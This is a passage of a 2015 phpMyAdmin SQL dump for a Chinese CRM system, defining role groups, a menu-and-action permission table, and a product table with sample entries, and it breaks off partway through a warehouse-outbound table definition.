-- phpMyAdmin SQL Dump
-- version 3.4.10.1
-- http://www.phpmyadmin.net
--
-- 主机: localhost
-- 生成日期: 2015 年 08 月 14 日 12:36
-- 服务器版本: 5.5.20
-- PHP 版本: 5.3.10

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- 数据库: `xycrm`
--

-- --------------------------------------------------------

--
-- 表的结构 `xy_auth_group`
--

CREATE TABLE IF NOT EXISTS `xy_auth_group` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `type` tinyint(1) NOT NULL,
  `title` char(50) NOT NULL,
  `level` int(2) NOT NULL,
  `pid` int(4) NOT NULL,
  `sort` int(4) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `rules` varchar(2000) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=24 ;

--
-- 转存表中的数据 `xy_auth_group`
--

INSERT INTO `xy_auth_group` (`id`, `type`, `title`, `level`, `pid`, `sort`, `status`, `rules`) VALUES
(1, 0, '综合办公室', 0, 0, 1, 1, '2'),
(5, 1, '系统管理员', 1, 1, 1, 1, '309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,332,333,334,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,351,352,353,354,355,356,357,358,359,360,361,362,363,364,403,365,366,402,367,368,369,370,371,372,373,374,375,376,377,404,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,398,396,397,405,399,401,400,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,441,427,428,429,430,431,432,436,433,434,435,437,438,439,440,442,443,444,445,446,447,451,448,449,450,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,472,470,471,473,474,475,476,477,478,480,479,481,482,483,484,485,486,487,488,292,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,1,2,5,3,4,6,7,8,9,10,11,12,13,14,15,16,17,58,18,19,20,21,22,23,56,24,261,262,263,264,265,266,25,26,27,28,57,29,30,31,32,33,34,35,36,247,61,60,37,38,59,39,40,41'),
(6, 1, '总经理', 1, 1, 2, 1, '309,310,311,312,313,316,317,318,319,320,321,324,325,326,327,330,331,332,333,335,336,337,338,341,342,343,344,345,346,349,350,351,352,353,354,355,356,359,360,361,362,403,365,366,402,367,368,369,370,371,372,373,376,377,404,378,379,380,381,384,385,386,387,390,391,392,393,398,396,397,405,537,399,401,406,407,408,409,412,413,414,415,416,419,420,421,422,423,426,441,427,428,429,430,436,433,434,435,437,438,439,440,442,443,444,445,451,448,449,450,452,453,454,455,456,457,458,459,462,463,464,465,466,467,472,470,471,473,474,475,476,480,479,481,482,483,484,485,488,490,532,533,535,536,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,295,296,297,298,299,301,302,303,304,306,307,308,5,3,4,6,7,9,10,11,12,13,15,16,17,58,18,19,21,22,23,262,263,264,36,247,61,60,38,59,40,41'),
(7, 1, '市场经理', 1, 15, 3, 1, '267,268,269,286,287,280,281,58'),
(14, 0, '财务部', 0, 0, 2, 1, ''),
(15, 0, '市场部', 0, 0, 3, 1, '309,310,311,312,313,318,319,320,321,324,325,326,327,335,336,337,338,339,340,341,342,343,344,345,346,347,348,349,350,353,354,359,360,361,362,363,364,403,365,366,402,367,368,369,370,371,372,373,374,376,377,404,378,379,380,381,384,385,386,387,390,391,392,393,394,398,397,405,537,399,401,406,407,408,409,412,413,414,415,418,490,532,533,491,492,493,494,496,498,499,500,501,502,503,504,505,506,517,518,521,522,523,526,527,528,531,292,294,295,305,306'),
(16, 0, '技术部', 0, 0, 4, 1, '309,310,311,312,313,318,319,320,321,324,325,326,327,335,336,337,338,339,340,341,342,343,344,345,346,348,349,350,351,353,354,359,360,361,362,363,364,403,365,366,402,367,368,369,413,414,415,418,292,294,295'),
(17, 1, '市场助理', 1, 15, 4, 1, '267,268,269,286,287,280,281'),
(18, 1, '技术工程师', 1, 16, 5, 1, '267,268,269,270,271,272,286,287,280,281,291,284'),
(20, 1, '会计', 1, 14, 0, 1, '309,310,311,312,313,314,316,317,318,319,321,324,325,326,327,335,336,337,338,339,340,341,342,343,344,345,346,349,350,351,352,353,354,359,360,361,362,363,364,403,365,366,402,367,368,369,390,391,399,401,419,420,421,422,423,425,426,441,463,464,465,466,467,468,469,473,474,475,476,477,478,482,483,484,485,486,487'),
(22, 1, '客服专员1', 1, 15, 6, 1, ''),
(23, 1, '客服专员2', 0, 0, 7, 1, '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_auth_group_access`
--

CREATE TABLE IF NOT EXISTS `xy_auth_group_access` (
  `uid` mediumint(8) NOT NULL,
  `group_id` mediumint(8) NOT NULL,
  KEY `uid` (`uid`),
  KEY `group_id` (`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `xy_auth_group_access`
--

INSERT INTO `xy_auth_group_access` (`uid`, `group_id`) VALUES
(1, 5),
(1, 1),
(15, 20),
(15, 1),
(8, 1),
(8, 5),
(14, 15),
(14, 18),
(13, 15),
(13, 18),
(12, 15),
(12, 18),
(11, 15),
(11, 7),
(10, 15),
(10, 17),
(9, 15),
(9, 19),
(16, 6),
(16, 1),
(17, 18),
(17, 16),
(18, 22),
(18, 15),
(19, 6),
(19, 1);

-- --------------------------------------------------------

--
-- 表的结构 `xy_auth_rule`
--

CREATE TABLE IF NOT EXISTS `xy_auth_rule` (
  `id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `level` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `name` char(80) NOT NULL DEFAULT '',
  `title` char(20) NOT NULL DEFAULT '',
  `type` tinyint(1) NOT NULL DEFAULT '1',
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `condition` char(100) NOT NULL DEFAULT '',
  `sort` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=546 ;

--
-- 转存表中的数据 `xy_auth_rule`
--

INSERT INTO `xy_auth_rule` (`id`, `level`, `pid`, `name`, `title`, `type`, `status`, `condition`, `sort`) VALUES
(1, 0, 0, 'home/system/index', '系统管理', 1, 1, '', 99),
(2, 1, 1, 'home/org/', '部门管理', 1, 1, '', 1),
(3, 2, 2, 'home/org/add', '新增', 1, 1, '', 1),
(4, 2, 2, 'home/org/edit', '编辑', 1, 1, '', 2),
(5, 2, 2, 'home/org/index', '查看', 1, 1, '', 0),
(6, 2, 2, 'home/org/del', '删除', 1, 1, '', 3),
(7, 2, 2, 'home/org/editrule', '权限', 1, 1, '', 4),
(8, 1, 1, 'home/dep', '职位管理', 1, 1, '', 2),
(9, 2, 8, 'home/dep/index', '查看', 1, 1, '', 0),
(10, 2, 8, 'home/dep/add', '新增', 1, 1, '', 1),
(11, 2, 8, 'home/dep/edit', '编辑', 1, 1, '', 2),
(12, 2, 8, 'home/dep/del', '删除', 1, 1, '', 3),
(13, 2, 8, 'home/dep/editrule', '权限', 1, 1, '', 4),
(14, 1, 1, 'home/user/', '用户管理', 1, 1, '', 3),
(15, 2, 14, 'home/user/index', '查看', 1, 1, '', 0),
(16, 2, 14, 'home/user/add', '新增', 1, 1, '', 1),
(17, 2, 14, 'home/user/edit', '编辑', 1, 1, '', 2),
(18, 2, 14, 'home/user/del', '删除', 1, 1, '', 3),
(19, 2, 14, 'home/user/editrule', '权限', 1, 1, '', 4),
(20, 1, 1, 'home/config/', '数据字典', 1, 1, '', 4),
(21, 2, 20, 'home/config/index', '查看', 1, 1, '', 0),
(22, 2, 20, 'home/config/add', '新增', 1, 1, '', 1),
(23, 2, 20, 'home/config/edit', '编辑', 1, 1, '', 2),
(24, 2, 20, 'home/config/del', '删除', 1, 1, '', 3),
(25, 1, 1, 'home/menu/', '菜单管理', 1, 1, '', 6),
(26, 2, 25, 'home/menu/index', '查看', 1, 1, '', 0),
(27, 2, 25, 'home/menu/add', '新增', 1, 1, '', 1),
(28, 2, 25, 'home/menu/edit', '编辑', 1, 1, '', 2),
(29, 2, 25, 'home/menu/del', '删除', 1, 1, '', 3),
(30, 1, 1, 'home/rule/', '功能列表', 1, 1, '', 8),
(31, 2, 30, 'home/rule/index', '查看', 1, 1, '', 0),
(32, 2, 30, 'home/rule/add', '新增', 1, 1, '', 1),
(33, 2, 30, 'home/rule/edit', '编辑', 1, 1, '', 2),
(34, 2, 30, 'home/rule/del', '删除', 1, 1, '', 3),
(35, 1, 1, 'home/database', '数据备份', 1, 1, '', 10),
(36, 2, 35, 'home/database/index', '查看', 1, 1, '', 0),
(37, 1, 1, 'home/database/', '备份文件', 1, 1, '', 11),
(38, 2, 37, 'home/database/bakup', '查看', 1, 1, '', 0),
(39, 1, 1, 'home/log', '操作日志', 1, 1, '', 15),
(40, 2, 39, 'home/log/index', '查看', 1, 1, '', 0),
(41, 2, 39, 'home/log/del', '删除', 1, 1, '', 1),
(56, 2, 20, 'home/config/lock', '锁定', 1, 1, '', 2),
(57, 2, 25, 'home/menu/lock', '锁定', 1, 1, '', 2),
(58, 2, 14, 'home/baoming/lock', '锁定', 1, 1, '', 2),
(59, 2, 37, 'home/database/del', '删除', 1, 1, '', 2),
(60, 2, 35, 'home/database/repair', '修复', 1, 1, '', 5),
(61, 2, 35, 'home/database/optimize', '优化', 1, 1, '', 3),
(247, 2, 35, 'home/database/export', '备份', 1, 1, '', 1),
(261, 1, 1, 'home/datalist/index', '分类字典', 1, 1, '', 5),
(262, 2, 261, 'home/datalist/view', '查看', 1, 1, '', 0),
(263, 2, 261, 'home/datalist/add', '新增', 1, 1, '', 1),
(264, 2, 261, 'home/datalist/edit', '编辑', 1, 1, '', 2),
(265, 2, 261, 'home/datalist/lock', '锁定', 1, 1, '', 3),
(266, 2, 261, 'home/datalist/del', '删除', 1, 1, '', 4),
(309, 0, 0, 'home/bangong/index', '个人办公', 1, 1, '', 0),
(310, 1, 309, 'home/quxiang/index', '我的去向', 1, 1, '', 0),
(311, 2, 310, 'home/quxiang/view', '查看', 1, 1, '', 0),
(312, 2, 310, 'home/quxiang/add', '新增', 1, 1, '', 1),
(313, 2, 310, 'home/quxiang/edit', '编辑', 1, 1, '', 2),
(314, 2, 310, 'home/quxiang/lock', '锁定', 1, 1, '', 3),
(315, 2, 310, 'home/quxiang/del', '删除', 1, 1, '', 4),
(316, 1, 309, 'home/quxiangs/index', '员工去向', 1, 1, '', 2),
(317, 2, 316, 'home/quxiangs/view', '查看', 1, 1, '', 0),
(318, 1, 309, 'home/renwu/index', '我的任务', 1, 1, '', 3),
(319, 2, 318, 'home/renwu/view', '查看', 1, 1, '', 0),
(320, 2, 318, 'home/renwu/add', '新增', 1, 1, '', 1),
(321, 2, 318, 'home/renwu/edit', '编辑', 1, 1, '', 2),
(322, 2, 318, 'home/renwu/lock', '锁定', 1, 1, '', 3),
(323, 2, 318, 'home/renwu/del', '删除', 1, 1, '', 4),
(324, 1, 309, 'home/huibao/index', '工作汇报', 1, 1, '', 4),
(325, 2, 324, 'home/huibao/view', '查看', 1, 1, '', 0),
(326, 2, 324, 'home/huibao/add', '新增', 1, 1, '', 1),
(327, 2, 324, 'home/huibao/edit', '编辑', 1, 1, '', 2),
(328, 2, 324, 'home/huibao/lock', '锁定', 1, 1, '', 3),
(329, 2, 324, 'home/huibao/del', '删除', 1, 1, '', 4),
(330, 1, 309, 'home/huibaos/index', '批注汇报', 1, 1, '', 5),
(331, 2, 330, 'home/huibaos/view', '查看', 1, 1, '', 0),
(332, 2, 330, 'home/huibaos/edit', '编辑', 1, 1, '', 2),
(333, 2, 330, 'home/huibaos/lock', '锁定', 1, 1, '', 3),
(334, 2, 330, 'home/huibaos/del', '删除', 1, 1, '', 4),
(335, 1, 309, 'home/wendang/index', '我的文档', 1, 1, '', 6),
(336, 2, 335, 'home/wendang/view', '查看', 1, 1, '', 0),
(337, 2, 335, 'home/wendang/add', '新增', 1, 1, '', 1),
(338, 2, 335, 'home/wendang/edit', '编辑', 1, 1, '', 2),
(339, 2, 335, 'home/wendang/lock', '锁定', 1, 1, '', 3),
(340, 2, 335, 'home/wendang/del', '删除', 1, 1, '', 4),
(341, 1, 309, 'home/wendangs/index', '共享文档', 1, 1, '', 7),
(342, 2, 341, 'home/wendangs/view', '查看', 1, 1, '', 0),
(343, 1, 309, 'home/zhishi/index', '知识管理', 1, 1, '', 8),
(344, 2, 343, 'home/zhishi/view', '查看', 1, 1, '', 0),
(345, 2, 343, 'home/zhishi/add', '新增', 1, 1, '', 1),
(346, 2, 343, 'home/zhishi/edit', '编辑', 1, 1, '', 2),
(347, 2, 343, 'home/zhishi/lock', '锁定', 1, 1, '', 3),
(348, 2, 343, 'home/zhishi/del', '删除', 1, 1, '', 4),
(349, 1, 309, 'home/msg/index', '我的消息', 1, 1, '', 9),
(350, 2, 349, 'home/msg/view', '查看', 1, 1, '', 0),
(351, 2, 349, 'home/msg/lock', '锁定', 1, 1, '', 3),
(352, 2, 349, 'home/msg/del', '删除', 1, 1, '', 4),
(353, 1, 309, 'home/tongzhi/index', '通知公告', 1, 1, '', 11),
(354, 2, 353, 'home/tongzhi/view', '查看', 1, 1, '', 0),
(355, 2, 353, 'home/tongzhi/add', '新增', 1, 1, '', 1),
(356, 2, 353, 'home/tongzhi/edit', '编辑', 1, 1, '', 2),
(357, 2, 353, 'home/tongzhi/lock', '锁定', 1, 1, '', 3),
(358, 2, 353, 'home/tongzhi/del', '删除', 1, 1, '', 4),
(359, 1, 309, 'home/wdtxl/index', '我的通讯录', 1, 1, '', 12),
(360, 2, 359, 'home/wdtxl/view', '查看', 1, 1, '', 0),
(361, 2, 359, 'home/wdtxl/add', '新增', 1, 1, '', 1),
(362, 2, 359, 'home/wdtxl/edit', '编辑', 1, 1, '', 2),
(363, 2, 359, 'home/wdtxl/lock', '锁定', 1, 1, '', 3),
(364, 2, 359, 'home/wdtxl/del', '删除', 1, 1, '', 4),
(365, 1, 309, 'home/ggtxl/index', '公共通讯录', 1, 1, '', 13),
(366, 2, 365, 'home/ggtxl/view', '查看', 1, 1, '', 0),
(367, 1, 309, 'home/dwtxl/index', '单位通讯录', 1, 1, '', 15),
(368, 2, 367, 'home/dwtxl/view', '查看', 1, 1, '', 0),
(369, 0, 0, 'home/kehu/index', '客户管理', 1, 1, '', 1),
(370, 1, 369, 'home/cust/index', '潜在客户', 1, 1, '', 1),
(371, 2, 370, 'home/cust/view', '查看', 1, 1, '', 0),
(372, 2, 370, 'home/cust/add', '新增', 1, 1, '', 1),
(373, 2, 370, 'home/cust/edit', '编辑', 1, 1, '', 2),
(374, 2, 370, 'home/cust/lock', '锁定', 1, 1, '', 3),
(375, 2, 370, 'home/cust/del', '删除', 1, 1, '', 4),
(376, 2, 370, 'home/cust/daoqi', '待跟踪', 1, 1, '', 5),
(377, 2, 370, 'home/cust/cheng', '成交客户', 1, 1, '', 6),
(378, 1, 369, 'home/custcon/index', '联系人', 1, 1, '', 2),
(379, 2, 378, 'home/custcon/view', '查看', 1, 1, '', 0),
(380, 2, 378, 'home/custcon/add', '新增', 1, 1, '', 1),
(381, 2, 378, 'home/custcon/edit', '编辑', 1, 1, '', 2),
(382, 2, 378, 'home/custcon/lock', '锁定', 1, 1, '', 3),
(383, 2, 378, 'home/custcon/del', '删除', 1, 1, '', 4),
(384, 1, 369, 'home/custgd/index', '跟单记录', 1, 1, '', 3),
(385, 2, 384, 'home/custgd/view', '查看', 1, 1, '', 0),
(386, 2, 384, 'home/custgd/add', '新增', 1, 1, '', 1),
(387, 2, 384, 'home/custgd/edit', '编辑', 1, 1, '', 2),
(388, 2, 384, 'home/custgd/lock', '锁定', 1, 1, '', 3),
(389, 2, 384, 'home/custgd/del', '删除', 1, 1, '', 4),
(390, 1, 369, 'home/hetong/index', '合同管理', 1, 1, '', 5),
(391, 2, 390, 'home/hetong/view', '查看', 1, 1, '', 0),
(392, 2, 390, 'home/hetong/add', '新增', 1, 1, '', 1),
(393, 2, 390, 'home/hetong/edit', '编辑', 1, 1, '', 2),
(394, 2, 390, 'home/hetong/lock', '锁定', 1, 1, '', 3),
(395, 2, 390, 'home/hetong/del', '删除', 1, 1, '', 4),
(396, 2, 390, 'home/hetong/shenhe', '审核', 1, 1, '', 5),
(397, 2, 390, 'home/hetong/dayin', '打印', 1, 1, '', 6),
(398, 2, 390, 'home/hetong/dshenhe', '待审核', 1, 1, '', 4),
(399, 1, 369, 'home/hetongs/index', '合同明细表', 1, 1, '', 7),
(400, 2, 399, 'home/hetongs/del', '删除', 1, 1, '', 4),
(401, 2, 399, 'home/hetongs/view', '查看', 1, 1, '', 1),
(402, 2, 365, 'home/ggtxl/outxls', '导出', 1, 1, '', 5),
(403, 2, 359, 'home/wdtxl/outxls', '导出', 1, 1, '', 5),
(404, 2, 370, 'home/cust/outxls', '导出', 1, 1, '', 7),
(405, 2, 390, 'home/hetong/outxls', '导出', 1, 1, '', 8),
(406, 1, 369, 'home/huifang/index', '客户回访', 1, 1, '', 9),
(407, 2, 406, 'home/huifang/view', '查看', 1, 1, '', 0),
(408, 2, 406, 'home/huifang/add', '新增', 1, 1, '', 1),
(409, 2, 406, 'home/huifang/edit', '编辑', 1, 1, '', 2),
(410, 2, 406, 'home/huifang/lock', '锁定', 1, 1, '', 3),
(411, 2, 406, 'home/huifang/del', '删除', 1, 1, '', 4),
(412, 2, 406, 'home/huifang/outxls', '导出', 1, 1, '', 6),
(413, 1, 369, 'home/tousu/index', '投诉管理', 1, 1, '', 10),
(414, 2, 413, 'home/tousu/view', '查看', 1, 1, '', 0),
(415, 2, 413, 'home/tousu/edit', '编辑', 1, 1, '', 2),
(416, 2, 413, 'home/tousu/lock', '锁定', 1, 1, '', 3),
(417, 2, 413, 'home/tousu/del', '删除', 1, 1, '', 4),
(418, 2, 413, 'home/tousu/outxls', '导出', 1, 1, '', 6),
(419, 0, 0, 'home/cangku/index', '仓库管理', 1, 1, '', 3),
(420, 1, 419, 'home/chanpin/index', '产品管理', 1, 1, '', 1),
(421, 2, 420, 'home/chanpin/view', '查看', 1, 1, '', 0),
(422, 2, 420, 'home/chanpin/add', '新增', 1, 1, '', 1),
(423, 2, 420, 'home/chanpin/edit', '编辑', 1, 1, '', 2),
(424, 2, 420, 'home/chanpin/lock', '锁定', 1, 1, '', 3),
(425, 2, 420, 'home/chanpin/del', '删除', 1, 1, '', 4),
(426, 2, 420, 'home/chanpin/outxls', '导出', 1, 1, '', 6),
(427, 1, 419, 'home/ruku/index', '入库管理', 1, 1, '', 2),
(428, 2, 427, 'home/ruku/view', '查看', 1, 1, '', 0),
(429, 2, 427, 'home/ruku/add', '新增', 1, 1, '', 1),
(430, 2, 427, 'home/ruku/edit', '编辑', 1, 1, '', 2),
(431, 2, 427, 'home/ruku/lock', '锁定', 1, 1, '', 3),
(432, 2, 427, 'home/ruku/del', '删除', 1, 1, '', 4),
(433, 2, 427, 'home/ruku/shenhe', '审核', 1, 1, '', 5),
(434, 2, 427, 'home/ruku/dayin', '打印', 1, 1, '', 6),
(435, 2, 427, 'home/ruku/outxls', '导出', 1, 1, '', 6),
(436, 2, 427, 'home/ruku/dshenhe', '待审核', 1, 1, '', 4),
(437, 1, 419, 'home/rukus/index', '入库明细表', 1, 1, '', 3),
(438, 2, 437, 'home/rukus/view', '查看', 1, 1, '', 0),
(439, 2, 437, 'home/rukus/del', '删除', 1, 1, '', 4),
(440, 2, 437, 'home/rukus/outxls', '导出', 1, 1, '', 6),
(441, 2, 420, 'home/chanpin/baojing', '库存报警', 1, 1, '', 7),
(442, 1, 419, 'home/chuku/index', '出库管理', 1, 1, '', 6),
(443, 2, 442, 'home/chuku/view', '查看', 1, 1, '', 0),
(444, 2, 442, 'home/chuku/add', '新增', 1, 1, '', 1),
(445, 2, 442, 'home/chuku/edit', '编辑', 1, 1, '', 2),
(446, 2, 442, 'home/chuku/lock', '锁定', 1, 1, '', 3),
(447, 2, 442, 'home/chuku/del', '删除', 1, 1, '', 4),
(448, 2, 442, 'home/chuku/shenhe', '审核', 1, 1, '', 5),
(449, 2, 442, 'home/chuku/dayin', '打印', 1, 1, '', 6),
(450, 2, 442, 'home/chuku/outxls', '导出', 1, 1, '', 6),
(451, 2, 442, 'home/chuku/dshenhe', '待审核', 1, 1, '', 4),
(452, 1, 419, 'home/chukus/index', '出库明细表', 1, 1, '', 7),
(453, 2, 452, 'home/chukus/view', '查看', 1, 1, '', 0),
(454, 2, 452, 'home/chukus/del', '删除', 1, 1, '', 4),
(455, 2, 452, 'home/chukus/outxls', '导出', 1, 1, '', 6),
(456, 1, 419, 'home/fahuo/index', '发货记录', 1, 1, '', 11),
(457, 2, 456, 'home/fahuo/view', '查看', 1, 1, '', 0),
(458, 2, 456, 'home/fahuo/add', '新增', 1, 1, '', 1),
(459, 2, 456, 'home/fahuo/edit', '编辑', 1, 1, '', 2),
(460, 2, 456, 'home/fahuo/lock', '锁定', 1, 1, '', 3),
(461, 2, 456, 'home/fahuo/del', '删除', 1, 1, '', 4),
(462, 2, 456, 'home/fahuo/outxls', '导出', 1, 1, '', 6),
(463, 0, 0, 'home/caiwu/index', '财务管理', 1, 1, '', 6),
(464, 1, 463, 'home/shou/index', '收款记录', 1, 1, '', 1),
(465, 2, 464, 'home/shou/view', '查看', 1, 1, '', 0),
(466, 2, 464, 'home/shou/add', '新增', 1, 1, '', 1),
(467, 2, 464, 'home/shou/edit', '编辑', 1, 1, '', 2),
(468, 2, 464, 'home/shou/lock', '锁定', 1, 1, '', 3),
(469, 2, 464, 'home/shou/del', '删除', 1, 1, '', 4),
(470, 2, 464, 'home/shou/shenhe', '审核', 1, 1, '', 5),
(471, 2, 464, 'home/shou/outxls', '导出', 1, 1, '', 6),
(472, 2, 464, 'home/shou/dshenhe', '待审核', 1, 1, '', 4),
(473, 1, 463, 'home/fukuan/index', '付款记录', 1, 1, '', 2),
(474, 2, 473, 'home/fukuan/view', '查看', 1, 1, '', 0),
(475, 2, 473, 'home/fukuan/add', '新增', 1, 1, '', 1),
(476, 2, 473, 'home/fukuan/edit', '编辑', 1, 1, '', 2),
(477, 2, 473, 'home/fukuan/lock', '锁定', 1, 1, '', 3),
(478, 2, 473, 'home/fukuan/del', '删除', 1, 1, '', 4),
(479, 2, 473, 'home/fukuan/shenhe', '审核', 1, 1, '', 5),
(480, 2, 473, 'home/fukuan/dshenhe', '待审核', 1, 1, '', 4),
(481, 2, 473, 'home/fukuan/outxls', '导出', 1, 1, '', 6),
(482, 1, 463, 'home/kaipiao/index', '开票记录', 1, 1, '', 3),
(483, 2, 482, 'home/kaipiao/view', '查看', 1, 1, '', 0),
(484, 2, 482, 'home/kaipiao/add', '新增', 1, 1, '', 1),
(485, 2, 482, 'home/kaipiao/edit', '编辑', 1, 1, '', 2),
(486, 2, 482, 'home/kaipiao/lock', '锁定', 1, 1, '', 3),
(487, 2, 482, 'home/kaipiao/del', '删除', 1, 1, '', 4),
(488, 2, 482, 'home/kaipiao/outxls', '导出', 1, 1, '', 6),
(489, 1, 1, 'home/public/clear', '清理缓存', 1, 1, '', 20),
(490, 0, 0, 'home/tongji/index', '统计分析', 1, 1, '', 9),
(491, 1, 490, 'home/fxcust/index', '客户管理', 1, 1, '', 1),
(492, 2, 491, 'home/fxcust/xuqiu', '需求分析', 1, 1, '', 0),
(493, 2, 491, 'home/fxcust/laiyuan', '来源分析', 1, 1, '', 1),
(494, 2, 491, 'home/fxcust/jinzhan', '进展分析', 1, 1, '', 2),
(495, 2, 491, 'home/fxcust/yewu', '业务员分析', 1, 1, '', 3),
(496, 2, 491, 'home/fxcust/qushi', '增长趋势', 1, 1, '', 4),
(497, 2, 491, 'home/fxcust/', '综合分析', 1, 1, '', 6),
(498, 1, 490, 'home/fxhetong/index', '合同管理', 1, 1, '', 2),
(499, 2, 498, 'home/fxhetong/qushi', '增长趋势(数量)', 1, 1, '', 0),
(500, 2, 498, 'home/fxhetong/qushijin', '签约金额', 1, 1, '', 1),
(501, 2, 498, 'home/fxhetong/qushishou', '已收款', 1, 1, '', 2),
(502, 2, 498, 'home/fxhetong/qushiwei', '未收款', 1, 1, '', 3),
(503, 2, 498, 'home/fxhetong/qushipiao', '已开票', 1, 1, '', 4),
(504, 2, 498, 'home/fxhetong/type', '类型分析', 1, 1, '', 5),
(505, 2, 498, 'home/fxhetong/jingban', '业务员分析', 1, 1, '', 6),
(506, 2, 498, 'home/fxhetong/daoqi', '到期合同', 1, 1, '', 6),
(507, 1, 490, 'home/fxchanpin/index', '仓库管理', 1, 1, '', 3),
(508, 2, 507, 'home/fxchanpin/rukus', '入库分析', 1, 1, '', 0),
(509, 2, 507, 'home/fxchanpin/chukus', '出库分析', 1, 1, '', 1),
(510, 2, 507, 'home/tjchanpin/index', '库存统计', 1, 1, '', 2),
(511, 2, 507, 'home/tjchanpin/dayin', '库存统计打印', 1, 1, '', 3),
(512, 1, 490, 'home/fxcaiwu/index', '财务管理', 1, 1, '', 4),
(513, 2, 512, 'home/fxcaiwu/shou', '收款分析', 1, 1, '', 0),
(514, 2, 512, 'home/fxcaiwu/fukuan', '付款分析', 1, 1, '', 1),
(515, 2, 512, 'home/fxcaiwu/leixing', '付款类型', 1, 1, '', 2),
(516, 2, 512, 'home/fxcaiwu/jingban', '业务员付款分析', 1, 1, '', 3),
(517, 1, 490, 'home/msgs/index', '消息记录', 1, 1, '', 10),
(518, 2, 517, 'home/msgs/view', '查看', 1, 1, '', 0),
(519, 2, 517, 'home/msgs/lock', '锁定', 1, 1, '', 3),
(520, 2, 517, 'home/msgs/del', '删除', 1, 1, '', 4),
(521, 2, 517, 'home/msgs/outxls', '导出', 1, 1, '', 6),
(522, 1, 490, 'home/emails/index', '邮件记录', 1, 1, '', 11),
(523, 2, 522, 'home/emails/view', '查看', 1, 1, '', 0),
(524, 2, 522, 'home/emails/lock', '锁定', 1, 1, '', 3),
(525, 2, 522, 'home/emails/del', '删除', 1, 1, '', 4),
(526, 2, 522, 'home/emails/outxls', '导出', 1, 1, '', 6),
(527, 1, 490, 'home/smss/index', '短信记录', 1, 1, '', 12),
(528, 2, 527, 'home/smss/view', '查看', 1, 1, '', 0),
(529, 2, 527, 'home/smss/lock', '锁定', 1, 1, '', 3),
(530, 2, 527, 'home/smss/del', '删除', 1, 1, '', 4),
(531, 2, 527, 'home/smss/outxls', '导出', 1, 1, '', 6),
(532, 1, 490, 'home/tjhetong/index', '业绩统计', 1, 1, '', 0),
(533, 2, 532, 'home/tjhetong/dayin', '打印', 1, 1, '', 0),
(537, 2, 390, 'home/hetong/daoqi', '到期', 1, 1, '', 8),
(535, 1, 490, 'home/tjbiao/index', '老板一张表', 1, 1, '', 0),
(536, 2, 535, 'home/tjbiao/dayin', '打印', 1, 1, '', 0);

-- --------------------------------------------------------

--
-- 表的结构 `xy_chanpin`
--

CREATE TABLE IF NOT EXISTS `xy_chanpin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  `type` varchar(200) NOT NULL,
  `danwei` varchar(20) NOT NULL,
  `rjiage` int(11) NOT NULL,
  `xjiage` int(11) NOT NULL,
  `kucun` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='产品管理' AUTO_INCREMENT=10 ;

--
-- 转存表中的数据 `xy_chanpin`
--

INSERT INTO `xy_chanpin` (`id`, `uid`, `uname`, `addtime`, `uuid`, `uuname`, `updatetime`, `status`, `title`, `bianhao`, `fenlei`, `type`, `danwei`, `rjiage`, `xjiage`, `kucun`, `beizhu`) VALUES
(1, 1, '陈高明', '2015-06-02 09:28:48', 1, '陈高明', '2015-06-02 09:29:13', 1, '客户管理管理系统', 'crm', '软件服务', '通用的可以适当定制', '套', 2000, 6800, 1999, '管理客户的'),
(2, 1, '陈高明', '2015-06-02 09:33:47', 1, '陈高明', '2015-06-02 09:36:45', 1, '加密狗', 'jmg01', '软件配套', '62K', '只', 30, 50, 33, '一套软件配一个'),
(3, 1, '陈高明', '2015-06-02 09:33:47', 1, '陈高明', '2015-06-02 09:36:34', 1, '小票打印机', 'sfz01', '软件配套', '热敏纸', '台', 1000, 1500, 12, '配热敏纸5卷'),
(4, 1, '陈高明', '2015-06-02 09:35:58', 1, '陈高明', '2015-06-02 09:36:25', 1, '美容院管理系统', 'CRM01', '软件服务', '通用', '套', 2000, 5800, 1999, ''),
(9, 16, '王晓丹', '2015-07-30 15:17:25', 16, '王晓丹', '2015-07-30 15:17:49', 1, 'd', 'd', '软件服务', '', '套', 111, 1, 0, '');

-- --------------------------------------------------------

--
-- 表的结构 `xy_chuku`
--

CREATE TABLE IF NOT EXISTS `xy_chuku` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
